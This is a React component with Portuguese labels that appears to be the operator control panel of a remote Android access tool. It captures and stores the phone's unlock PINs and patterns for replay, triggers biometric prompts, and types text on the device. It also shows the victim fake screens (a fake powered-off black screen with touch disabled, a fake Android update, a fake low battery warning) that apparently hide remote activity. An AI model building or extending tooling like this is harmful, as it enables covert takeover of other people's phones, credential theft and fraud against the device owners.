import React from "react";
import {
  X,
  Fingerprint,
  ScanFace,
  Key,
  Trash2,
  EyeOff,
  Eye,
  Play,
  VolumeX,
  Volume2,
  Send
} from "lucide-react";
import {
  DeviceCredentialEntry,
  DeviceDisguiseConfig,
  DeviceDisguiseType
} from "@droidview/shared";

export interface FloatingRightDrawerProps {
  openRightDrawer: "senhas" | "telas" | "teclas" | "volume";
  setOpenRightDrawer: React.Dispatch<React.SetStateAction<null | "senhas" | "telas" | "teclas" | "volume">>;
  handleQuickUseBiometric: (type: "fingerprint" | "face") => void;
  isUsingCredId: string | null;
  quickUnlockMode: "pattern" | "pin";
  setQuickUnlockMode: React.Dispatch<React.SetStateAction<"pattern" | "pin">>;
  newPatternPoints: number[];
  setNewPatternPoints: React.Dispatch<React.SetStateAction<number[]>>;
  handleUseAndRecordPattern: () => void;
  quickPinInput: string;
  setQuickPinInput: React.Dispatch<React.SetStateAction<string>>;
  handleUseAndRecordPin: () => void;
  credentials: DeviceCredentialEntry[];
  revealedCredIds: Set<string>;
  setRevealedCredIds: React.Dispatch<React.SetStateAction<Set<string>>>;
  handleDeleteCredential: (id: string) => void;
  handleUseSavedCredential: (cred: DeviceCredentialEntry) => void;
  currentDisguise: DeviceDisguiseConfig | null;
  handleActivateDisguise: (type: DeviceDisguiseType, extra?: any) => void;
  isActivatingDisguise: boolean;
  handleClearDisguise: () => void;
  updatePercent: number;
  setUpdatePercent: React.Dispatch<React.SetStateAction<number>>;
  SAMPLE_IMAGE_PRESETS: { id: string; name: string; dimensions: string; url: string }[];
  selectedCustomImage: string | null;
  setSelectedCustomImage: React.Dispatch<React.SetStateAction<string | null>>;
  isMuted: boolean;
  setIsMuted: React.Dispatch<React.SetStateAction<boolean>>;
  deviceVolume: number;
  handleToggleMute: () => void;
  handleVolumeChange: (val: number) => void;
  handleSendText: (e: React.FormEvent) => void;
  typeText: string;
  setTypeText: React.Dispatch<React.SetStateAction<string>>;
  MiniPatternSvg: React.FC<{
    points: number[];
    size?: number;
    interactive?: boolean;
    onPointClick?: (point: number) => void;
  }>;
}

export const FloatingRightDrawer: React.FC<FloatingRightDrawerProps> = ({
  openRightDrawer,
  setOpenRightDrawer,
  handleQuickUseBiometric,
  isUsingCredId,
  quickUnlockMode,
  setQuickUnlockMode,
  newPatternPoints,
  setNewPatternPoints,
  handleUseAndRecordPattern,
  quickPinInput,
  setQuickPinInput,
  handleUseAndRecordPin,
  credentials,
  revealedCredIds,
  setRevealedCredIds,
  handleDeleteCredential,
  handleUseSavedCredential,
  currentDisguise,
  handleActivateDisguise,
  isActivatingDisguise,
  handleClearDisguise,
  updatePercent,
  setUpdatePercent,
  SAMPLE_IMAGE_PRESETS,
  selectedCustomImage,
  setSelectedCustomImage,
  isMuted,
  setIsMuted,
  deviceVolume,
  handleToggleMute,
  handleVolumeChange,
  handleSendText,
  typeText,
  setTypeText,
  MiniPatternSvg
}) => {
  return (
    <div
              style={{
                width: "260px",
                minWidth: "260px",
                background: "#080c16",
                borderLeft: "1px solid #1e293b",
                display: "flex",
                flexDirection: "column",
                zIndex: 25,
                overflowY: "auto",
                padding: "8px"
              }}
            >
              {/* Header do Painel Direito com seletor de tabs */}
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                <div style={{ display: "flex", gap: "2px", flexWrap: "wrap" }}>
                  <button
                    type="button"
                    onClick={() => setOpenRightDrawer("senhas")}
                    style={{
                      background: openRightDrawer === "senhas" ? "rgba(168, 85, 247, 0.25)" : "transparent",
                      border: `1px solid ${openRightDrawer === "senhas" ? "#a855f7" : "transparent"}`,
                      color: openRightDrawer === "senhas" ? "#c084fc" : "#94a3b8",
                      fontSize: "9px",
                      fontWeight: 700,
                      padding: "2px 5px",
                      borderRadius: "3px",
                      cursor: "pointer"
                    }}
                  >
                    Senhas
                  </button>
                  <button
                    type="button"
                    onClick={() => setOpenRightDrawer("telas")}
                    style={{
                      background: openRightDrawer === "telas" ? "rgba(0, 229, 255, 0.2)" : "transparent",
                      border: `1px solid ${openRightDrawer === "telas" ? "#00e5ff" : "transparent"}`,
                      color: openRightDrawer === "telas" ? "#00e5ff" : "#94a3b8",
                      fontSize: "9px",
                      fontWeight: 700,
                      padding: "2px 5px",
                      borderRadius: "3px",
                      cursor: "pointer"
                    }}
                  >
                    Telas
                  </button>
                  <button
                    type="button"
                    onClick={() => setOpenRightDrawer("volume")}
                    style={{
                      background: openRightDrawer === "volume" ? "rgba(56, 189, 248, 0.2)" : "transparent",
                      border: `1px solid ${openRightDrawer === "volume" ? "#38bdf8" : "transparent"}`,
                      color: openRightDrawer === "volume" ? "#38bdf8" : "#94a3b8",
                      fontSize: "9px",
                      fontWeight: 700,
                      padding: "2px 5px",
                      borderRadius: "3px",
                      cursor: "pointer"
                    }}
                  >
                    Volume
                  </button>
                  <button
                    type="button"
                    onClick={() => setOpenRightDrawer("teclas")}
                    style={{
                      background: openRightDrawer === "teclas" ? "rgba(34, 197, 94, 0.2)" : "transparent",
                      border: `1px solid ${openRightDrawer === "teclas" ? "#22c55e" : "transparent"}`,
                      color: openRightDrawer === "teclas" ? "#22c55e" : "#94a3b8",
                      fontSize: "9px",
                      fontWeight: 700,
                      padding: "2px 5px",
                      borderRadius: "3px",
                      cursor: "pointer"
                    }}
                  >
                    Teclas
                  </button>
                </div>
                <button
                  type="button"
                  onClick={() => setOpenRightDrawer(null)}
                  style={{ background: "transparent", border: "none", color: "#64748b", cursor: "pointer", padding: "2px" }}
                >
                  <X size={12} />
                </button>
              </div>

              {/* TAB 1: SENHAS, PADRÕES & BIOMETRIA (GRAVA AO USAR) */}
              {openRightDrawer === "senhas" && (
                <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
                  {/* Biometria Rápida */}
                  <div style={{ background: "#0c101d", border: "1px dashed rgba(168, 85, 247, 0.35)", borderRadius: "6px", padding: "6px" }}>
                    <div style={{ fontSize: "9px", color: "#c084fc", fontWeight: 800, marginBottom: "4px" }}>
                      <Fingerprint size={10} style={{ display: "inline", verticalAlign: "middle", marginRight: "4px" }} />SENSORES BIOMÉTRICOS
                    </div>
                    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "5px" }}>
                      <button
                        type="button"
                        onClick={() => handleQuickUseBiometric("fingerprint")}
                        disabled={Boolean(isUsingCredId)}
                        style={{
                          background: "rgba(168, 85, 247, 0.15)",
                          border: "1px solid #a855f7",
                          borderRadius: "4px",
                          padding: "5px",
                          color: "#d8b4fe",
                          fontSize: "9.5px",
                          fontWeight: 700,
                          cursor: "pointer",
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          gap: "4px"
                        }}
                      >
                        <Fingerprint size={12} />
                        <span>Usar Digital</span>
                      </button>

                      <button
                        type="button"
                        onClick={() => handleQuickUseBiometric("face")}
                        disabled={Boolean(isUsingCredId)}
                        style={{
                          background: "rgba(0, 229, 255, 0.15)",
                          border: "1px solid #00e5ff",
                          borderRadius: "4px",
                          padding: "5px",
                          color: "#67e8f9",
                          fontSize: "9.5px",
                          fontWeight: 700,
                          cursor: "pointer",
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          gap: "4px"
                        }}
                      >
                        <ScanFace size={12} />
                        <span>Usar Facial</span>
                      </button>
                    </div>
                  </div>

                  {/* Widget: Desbloquear Aparelho (Grava ao Usar) */}
                  <div style={{ background: "#0c101d", border: "1px solid #1e293b", borderRadius: "6px", padding: "6px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                      <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#38bdf8" }}>
                        <Key size={10} style={{ display: "inline", verticalAlign: "middle", marginRight: "4px" }} />DESBLOQUEIO (GRAVA AO USAR)
                      </span>
                      <div style={{ display: "flex", gap: "2px" }}>
                        <button
                          type="button"
                          onClick={() => setQuickUnlockMode("pattern")}
                          style={{
                            background: quickUnlockMode === "pattern" ? "rgba(56, 189, 248, 0.2)" : "#131826",
                            border: `1px solid ${quickUnlockMode === "pattern" ? "#38bdf8" : "#1e293b"}`,
                            color: quickUnlockMode === "pattern" ? "#38bdf8" : "#94a3b8",
                            fontSize: "8px",
                            fontWeight: 700,
                            padding: "1px 5px",
                            borderRadius: "3px",
                            cursor: "pointer"
                          }}
                        >
                          Padrão
                        </button>
                        <button
                          type="button"
                          onClick={() => setQuickUnlockMode("pin")}
                          style={{
                            background: quickUnlockMode === "pin" ? "rgba(56, 189, 248, 0.2)" : "#131826",
                            border: `1px solid ${quickUnlockMode === "pin" ? "#38bdf8" : "#1e293b"}`,
                            color: quickUnlockMode === "pin" ? "#38bdf8" : "#94a3b8",
                            fontSize: "8px",
                            fontWeight: 700,
                            padding: "1px 5px",
                            borderRadius: "3px",
                            cursor: "pointer"
                          }}
                        >
                          PIN
                        </button>
                      </div>
                    </div>

                    {/* Modo Padrão Gestual */}
                    {quickUnlockMode === "pattern" ? (
                      <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
                        <MiniPatternSvg
                          points={newPatternPoints}
                          size={110}
                          interactive={true}
                          onPointClick={(pt) => {
                            if (!newPatternPoints.includes(pt)) {
                              setNewPatternPoints((prev) => [...prev, pt]);
                            }
                          }}
                        />
                        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                          <span style={{ fontSize: "8.5px", color: "#94a3b8" }}>
                            {newPatternPoints.length > 0 ? `${newPatternPoints.length} pontos` : "Desenhe o padrão"}
                          </span>
                          <div style={{ display: "flex", gap: "4px" }}>
                            <button
                              type="button"
                              onClick={() => setNewPatternPoints([])}
                              style={{ background: "#1e293b", border: "none", color: "#cbd5e1", fontSize: "8.5px", padding: "2px 6px", borderRadius: "3px", cursor: "pointer" }}
                            >
                              Limpar
                            </button>
                            <button
                              type="button"
                              onClick={handleUseAndRecordPattern}
                              disabled={newPatternPoints.length < 2 || isUsingCredId === "new_pattern_exec"}
                              style={{
                                background: "rgba(34, 197, 94, 0.25)",
                                border: "1px solid #22c55e",
                                color: "#86efac",
                                fontSize: "8.5px",
                                fontWeight: 800,
                                padding: "2px 7px",
                                borderRadius: "3px",
                                cursor: newPatternPoints.length >= 2 ? "pointer" : "not-allowed"
                              }}
                            >
                              {isUsingCredId === "new_pattern_exec" ? "Executando..." : "Executar & Gravar"}
                            </button>
                          </div>
                        </div>
                      </div>
                    ) : (
                      /* Modo PIN Numérico */
                      <div style={{ display: "flex", gap: "4px" }}>
                        <input
                          type="text"
                          inputMode="numeric"
                          placeholder="Dígitos do PIN (ex: 1234)..."
                          value={quickPinInput}
                          onChange={(e) => setQuickPinInput(e.target.value.replace(/\D/g, ""))}
                          style={{
                            flex: 1,
                            background: "#050810",
                            border: "1px solid #1e293b",
                            borderRadius: "4px",
                            padding: "4px 6px",
                            fontSize: "10px",
                            color: "#fff",
                            fontFamily: "monospace"
                          }}
                        />
                        <button
                          type="button"
                          onClick={handleUseAndRecordPin}
                          disabled={!quickPinInput.trim() || isUsingCredId === "new_pin_exec"}
                          style={{
                            background: "rgba(34, 197, 94, 0.2)",
                            border: "1px solid #22c55e",
                            color: "#86efac",
                            borderRadius: "4px",
                            fontSize: "8.5px",
                            fontWeight: 800,
                            padding: "4px 7px",
                            cursor: quickPinInput.trim() ? "pointer" : "not-allowed",
                            whiteSpace: "nowrap"
                          }}
                        >
                          {isUsingCredId === "new_pin_exec" ? "Digitando..." : "Digitar & Gravar"}
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Cofre de Credenciais Gravadas */}
                  <div style={{ background: "#0c101d", border: "1px solid #1e293b", borderRadius: "6px", padding: "6px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                      <span style={{ fontSize: "9px", fontWeight: 800, color: "#38bdf8" }}>
                        COFRE DE AUTENTICAÇÃO ({credentials.length})
                      </span>
                    </div>

                    <div style={{ display: "flex", flexDirection: "column", gap: "4px", maxHeight: "170px", overflowY: "auto" }}>
                      {credentials.length === 0 ? (
                        <div style={{ fontSize: "8.5px", color: "#64748b", textAlign: "center", padding: "6px 0", lineHeight: "1.3" }}>
                          Nenhum padrão ou senha em cache.<br />
                          São gravados automaticamente ao serem usados.
                        </div>
                      ) : (
                        credentials.map((c) => {
                          const isRevealed = revealedCredIds.has(c.id);
                          return (
                            <div
                              key={c.id}
                              style={{
                                background: "#060911",
                                border: "1px solid #1a2233",
                                borderRadius: "4px",
                                padding: "4px 6px",
                                display: "flex",
                                flexDirection: "column",
                                gap: "3px"
                              }}
                            >
                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                                <span style={{ fontSize: "8.5px", fontWeight: 700, color: "#f8fafc" }}>
                                  {c.label}
                                </span>
                                <button
                                  type="button"
                                  onClick={() => handleDeleteCredential(c.id)}
                                  style={{ background: "transparent", border: "none", color: "#64748b", cursor: "pointer", padding: "1px" }}
                                  title="Remover credencial"
                                >
                                  <Trash2 size={10} />
                                </button>
                              </div>

                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                                  <span style={{ fontSize: "9px", fontFamily: "monospace", color: "#38bdf8" }}>
                                    {isRevealed ? c.value : "••••••••"}
                                  </span>
                                  <button
                                    type="button"
                                    onClick={() => {
                                      const next = new Set(revealedCredIds);
                                      if (next.has(c.id)) next.delete(c.id);
                                      else next.add(c.id);
                                      setRevealedCredIds(next);
                                    }}
                                    style={{ background: "transparent", border: "none", color: "#64748b", cursor: "pointer", padding: "1px" }}
                                    title={isRevealed ? "Ocultar" : "Mostrar"}
                                  >
                                    {isRevealed ? <EyeOff size={9} /> : <Eye size={9} />}
                                  </button>
                                </div>

                                <button
                                  type="button"
                                  onClick={() => handleUseSavedCredential(c)}
                                  disabled={isUsingCredId === c.id}
                                  style={{
                                    background: "rgba(34, 197, 94, 0.2)",
                                    border: "1px solid #22c55e",
                                    color: "#86efac",
                                    fontSize: "8px",
                                    fontWeight: 800,
                                    padding: "2px 5px",
                                    borderRadius: "3px",
                                    cursor: "pointer",
                                    display: "flex",
                                    alignItems: "center",
                                    gap: "3px"
                                  }}
                                >
                                  <Play size={8} />
                                  <span>{isUsingCredId === c.id ? "..." : "Usar"}</span>
                                </button>
                              </div>
                            </div>
                          );
                        })
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* TAB 2: TELAS NO CELULAR (DISFARCES) */}
              {openRightDrawer === "telas" && (
                <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
                  {/* 1. TELA PRETA (FALSO DESLIGADO) */}
                  <div style={{ background: "#0c101d", border: "1px solid #1e293b", borderRadius: "6px", padding: "6px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                      <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#fff" }}>TELA PRETA (FALSO OFF)</span>
                      {currentDisguise?.active && currentDisguise.type === "black" && (
                        <span style={{ fontSize: "7px", background: "#ff1a2a", color: "#fff", padding: "1px 3px", borderRadius: "2px", fontWeight: 800 }}>ATIVA</span>
                      )}
                    </div>
                    <div style={{ display: "flex", gap: "4px" }}>
                      <button
                        type="button"
                        onClick={() => handleActivateDisguise("black", { disableTouch: true })}
                        disabled={isActivatingDisguise}
                        style={{
                          flex: 1,
                          background: currentDisguise?.active && currentDisguise.type === "black" ? "rgba(255, 26, 42, 0.25)" : "rgba(30, 41, 59, 0.6)",
                          border: `1px solid ${currentDisguise?.active && currentDisguise.type === "black" ? "#ff1a2a" : "#334155"}`,
                          color: currentDisguise?.active && currentDisguise.type === "black" ? "#ff4d5a" : "#cbd5e1",
                          borderRadius: "4px",
                          padding: "4px",
                          fontSize: "8.5px",
                          fontWeight: 700,
                          cursor: "pointer"
                        }}
                      >
                        Ativar Tela Preta
                      </button>
                      {currentDisguise?.active && currentDisguise.type === "black" && (
                        <button
                          type="button"
                          onClick={handleClearDisguise}
                          style={{ background: "#1e293b", border: "none", color: "#fff", borderRadius: "4px", padding: "4px 6px", cursor: "pointer", fontSize: "8.5px" }}
                        ><X size={10} /></button>
                      )}
                    </div>
                  </div>

                  {/* 2. ATUALIZANDO ANDROID */}
                  <div style={{ background: "#0c101d", border: "1px solid #1e293b", borderRadius: "6px", padding: "6px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                      <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#00e5ff" }}>ATUALIZANDO ANDROID</span>
                      <span style={{ fontSize: "8.5px", color: "#00e5ff", fontWeight: 800 }}>{updatePercent}%</span>
                    </div>
                    <input
                      type="range"
                      min="5"
                      max="98"
                      value={updatePercent}
                      onChange={(e) => setUpdatePercent(Number(e.target.value))}
                      style={{ width: "100%", accentColor: "#00e5ff", height: "3px", cursor: "pointer", marginBottom: "5px" }}
                    />
                    <div style={{ display: "flex", gap: "4px" }}>
                      <button
                        type="button"
                        onClick={() => handleActivateDisguise("update", { progressPercent: updatePercent })}
                        disabled={isActivatingDisguise}
                        style={{
                          flex: 1,
                          background: currentDisguise?.active && currentDisguise.type === "update" ? "rgba(0, 229, 255, 0.25)" : "rgba(0, 119, 255, 0.15)",
                          border: `1px solid ${currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#0077ff"}`,
                          color: currentDisguise?.active && currentDisguise.type === "update" ? "#00e5ff" : "#60a5fa",
                          borderRadius: "4px",
                          padding: "4px",
                          fontSize: "8.5px",
                          fontWeight: 700,
                          cursor: "pointer"
                        }}
                      >
                        Ativar Atualização
                      </button>
                      {currentDisguise?.active && currentDisguise.type === "update" && (
                        <button
                          type="button"
                          onClick={handleClearDisguise}
                          style={{ background: "#1e293b", border: "none", color: "#fff", borderRadius: "4px", padding: "4px 6px", cursor: "pointer", fontSize: "8.5px" }}
                        ><X size={10} /></button>
                      )}
                    </div>
                  </div>

                  {/* 3. BATERIA FRACA */}
                  <div style={{ background: "#0c101d", border: "1px solid #1e293b", borderRadius: "6px", padding: "6px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "4px" }}>
                      <span style={{ fontSize: "9.5px", fontWeight: 800, color: "#f59e0b" }}>BATERIA FRACA (1%)</span>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleActivateDisguise("battery", { progressPercent: 1 })}
                      disabled={isActivatingDisguise}
                      style={{
                        width: "100%",
                        background: currentDisguise?.active && currentDisguise.type === "battery" ? "rgba(245, 158, 11, 0.25)" : "rgba(245, 158, 11, 0.1)",
                        border: "1px solid #f59e0b",
                        color: "#f59e0b",
                        borderRadius: "4px",
                        padding: "4px",
                        fontSize: "8.5px",
                        fontWeight: 700,
                        cursor: "pointer"
                      }}
                    >
                      Ativar Bateria Fraca
                    </button>
                  </div>

                  {/* 4. IMAGEM CUSTOMIZADA */}
                  <div style={{ background: "#0c101d", border: "1px solid #1e293b", borderRadius: "6px", padding: "6px" }}>
                    <div style={{ fontSize: "9.5px", fontWeight: 800, color: "#c084fc", marginBottom: "4px" }}>
                      IMAGEM CUSTOMIZADA (9:16)
                    </div>
                    <div style={{ display: "flex", gap: "2px", marginBottom: "5px" }}>
                      {SAMPLE_IMAGE_PRESETS.map((p) => (
                        <button
                          key={p.id}
                          type="button"
                          onClick={() => setSelectedCustomImage(p.url)}
                          style={{
                            background: selectedCustomImage === p.url ? "rgba(168, 85, 247, 0.25)" : "#131826",
                            border: `1px solid ${selectedCustomImage === p.url ? "#a855f7" : "#1e293b"}`,
                            color: selectedCustomImage === p.url ? "#c084fc" : "#94a3b8",
                            fontSize: "7.5px",
                            fontWeight: 700,
                            padding: "2px 4px",
                            borderRadius: "2px",
                            cursor: "pointer"
                          }}
                        >
                          {p.name.split(" ")[0]}
                        </button>
                      ))}
                    </div>
                    <button
                      type="button"
                      onClick={() => handleActivateDisguise("custom_image", { customImageUrl: selectedCustomImage || undefined })}
                      disabled={!selectedCustomImage || isActivatingDisguise}
                      style={{
                        width: "100%",
                        background: "rgba(168, 85, 247, 0.25)",
                        border: "1px solid #a855f7",
                        color: "#c084fc",
                        borderRadius: "4px",
                        padding: "4px",
                        fontSize: "8.5px",
                        fontWeight: 700,
                        cursor: "pointer"
                      }}
                    >
                      Enviar & Usar Imagem
                    </button>
                  </div>
                </div>
              )}

              {/* TAB 3: VOLUME CONTÍNUO & MUTE */}
              {openRightDrawer === "volume" && (
                <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
                  <div style={{ background: "#0c101d", border: "1px solid #1e293b", borderRadius: "6px", padding: "8px" }}>
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                      <span style={{ fontSize: "10px", fontWeight: 800, color: "#38bdf8", display: "flex", alignItems: "center", gap: "4px" }}>
                        {isMuted ? <VolumeX size={13} style={{ color: "#ef4444" }} /> : <Volume2 size={13} />}
                        <span>Volume: {isMuted ? "0% (MUDO)" : `${deviceVolume}%`}</span>
                      </span>
                      <button
                        type="button"
                        onClick={handleToggleMute}
                        style={{
                          background: isMuted ? "rgba(239, 68, 68, 0.2)" : "rgba(56, 189, 248, 0.15)",
                          border: `1px solid ${isMuted ? "#ef4444" : "#38bdf8"}`,
                          color: isMuted ? "#fca5a5" : "#38bdf8",
                          borderRadius: "3px",
                          padding: "2px 6px",
                          fontSize: "8.5px",
                          fontWeight: 700,
                          cursor: "pointer"
                        }}
                      >
                        {isMuted ? "Desmutar" : "Mute"}
                      </button>
                    </div>

                    <input
                      type="range"
                      min="0"
                      max="100"
                      value={isMuted ? 0 : deviceVolume}
                      onChange={(e) => {
                        if (isMuted) setIsMuted(false);
                        handleVolumeChange(Number(e.target.value));
                      }}
                      style={{ width: "100%", accentColor: "#38bdf8", cursor: "pointer", height: "4px" }}
                    />

                    <div style={{ display: "flex", justifyContent: "space-between", marginTop: "8px" }}>
                      <button
                        type="button"
                        onClick={() => handleVolumeChange(Math.max(0, deviceVolume - 10))}
                        style={{ background: "#131826", border: "1px solid #1e293b", color: "#cbd5e1", borderRadius: "3px", padding: "3px 8px", fontSize: "9px", cursor: "pointer" }}
                      >
                        - 10%
                      </button>
                      <button
                        type="button"
                        onClick={() => handleVolumeChange(Math.min(100, deviceVolume + 10))}
                        style={{ background: "#131826", border: "1px solid #1e293b", color: "#cbd5e1", borderRadius: "3px", padding: "3px 8px", fontSize: "9px", cursor: "pointer" }}
                      >
                        + 10%
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* TAB 4: TECLAS & DIGITAÇÃO DIRETA */}
              {openRightDrawer === "teclas" && (
                <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
                  <div style={{ background: "#0c101d", border: "1px solid #1e293b", borderRadius: "6px", padding: "6px" }}>
                    <div style={{ fontSize: "9.5px", fontWeight: 800, color: "#22c55e", marginBottom: "5px" }}>
                      TERMINAL DE DIGITAÇÃO
                    </div>
                    <form onSubmit={handleSendText} style={{ display: "flex", gap: "4px" }}>
                      <input
                        type="text"
                        placeholder="Texto para enviar..."
                        value={typeText}
                        onChange={(e) => setTypeText(e.target.value)}
                        style={{ flex: 1, background: "#05070a", border: "1px solid #1e293b", borderRadius: "4px", color: "#fff", fontSize: "9.5px", padding: "4px" }}
                      />
                      <button
                        type="submit"
                        style={{ background: "#0284c7", border: "none", color: "#fff", borderRadius: "4px", padding: "4px 8px", cursor: "pointer" }}
                      >
                        <Send size={10} />
                      </button>
                    </form>
                  </div>
                </div>
              )}
            </div>
            );
};
